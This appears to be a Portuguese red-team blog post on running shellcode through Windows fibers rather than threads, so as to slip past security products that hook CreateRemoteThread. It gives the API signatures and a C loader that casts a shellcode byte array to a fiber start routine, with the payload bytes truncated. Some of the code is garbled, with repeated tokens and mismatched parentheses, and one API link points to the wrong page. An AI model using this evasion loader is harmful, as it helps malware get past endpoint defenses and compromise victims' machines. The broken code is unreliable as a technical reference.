---
title: Using fibers for shellcode execution
published: 2024-11-05
description: 'Using fibers instead of threads to execute shellcode'
image: './banner.png'
tags: [red-team, malware]
category: 'Malware'
draft: false 
lang: ''
---

# Introdução

Em estudos recentes eu estava tendo alguns problemas ao contornar uma solução de segurança, pois não conseguia dar bypass no hook em que era colocado nas api's de thread, como CreateRemoteThread e suas variações, foi então que pesquisando um pouco sobre uma alternativa ao uso de threads para executar codigo eu li sobre os Fibers na documentação da Microsoft, e também vi que era possivel aproveitar deles para o nosso cenario de injeção de codigo.

# O que são os Fibers?

De acordo com a documentação da microsoft:

```A fiber is a unit of execution that must be manually scheduled by the application. Fibers run in the context of the threads that schedule them. Each thread can schedule multiple fibers.```

A maior diferença entre fibers e threads é a comunicação com o kernel. Cada thread possui sua própria stack e conjunto de registradores, mas acaba compartilhando o mesmo espaço de memória e recursos aos quais pertence.

No caso de context switch entre threads, isso será gerenciado pelo sistema operacional e envolve um custo de desempenho maior, pois o sistema operacional precisará salvar o estado atual da thread para, então, carregar o estado da nova thread.

Já com os fibbers, como eles não são gerenciados pelo kernel ou seja são gerenciados pela propia aplicação, o context switch entre fibers é muito menor do que entre threads, pois não há nescessidade de chamadas ao sistema operacional para alternar entre elas.

# Como utilizamos os Fibers?

Para execurtamos uma tarefa com Fibers vamos precisar de três funções. Existem algumas outras correlatas a utilização dos fibers, mas para a execução de um shellcode vamos utilizar apenas três. 

A descrição delas pelo msdn é um pouco redundante então tentei captar oque eu entendi.

## [CreateFiber](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfiber)
É usada para criar uma nova fiber, que é uma unidade leve de execução gerenciada pela aplicação.

Se a função for bem-sucedida, CreateFiber vai retornar o endereço do Fiber criado.
```c++
LPVOID CreateFiber(
  [in]           SIZE_T                dwStackSize,
  [in]           LPFIBER_START_ROUTINE lpStartAddress,
  [in, optional] LPVOID                lpParameter
);
```

## [ConvertThreadToFiber](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-convertfibertothread)
É usada para converter uma thread existente em uma fiber. Isso é necessário porque, no Windows, apenas uma thread que já foi convertida para uma fiber pode criar e alternar para outras fibers.
```c++
LPVOID ConvertThreadToFiberConvertThreadToFiber((
    [[inin,, optionaloptional]] LPVOID lpParameterLPVOID lpParameter 
));;
```

## [SwitchToFiber](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-switchtofiber)
Responsável pela troca e execução para o fiber especificado. Esse é o ponto principal do controle manual das fibers, permitindo que você alterne entre diferentes fibers de acordo com as necessidades da aplicação.
```c++
void SwitchToFiber(
  [in] LPVOID lpFiber
);
```

# Executando código com Fibers

Já sabendo das funções que precisamos e seus parametros, basta montar o código

```c

#include <stdio.h>
#include <windows.h>

unsigned char shellcode[] = {0x17, 0x5a, 0x63, ...};

int main(){

  LPVOID fibershellcode = NULL;
  
    if(!(fibershellcode = CreateFiber((0x000, (LPFIBER_START_ROUTINELPFIBER_START_ROUTINE)shellcode, NULL))){
          printf("Erro ao criar o objeto fiber \n");
          return -1;
    }

    ConvertThreadToFiber(NULL);

    SwitchToFiber(fibershellcode);
    
}
```

# Conclusão

Bom, é basicamente isso, o uso de Fibers para esse contexto também não é uma bala de prata contra proteções, acredito que algumas soluções devam monitorar também as funções de fibers, mas é um recurso muito legal se bem utilizado.

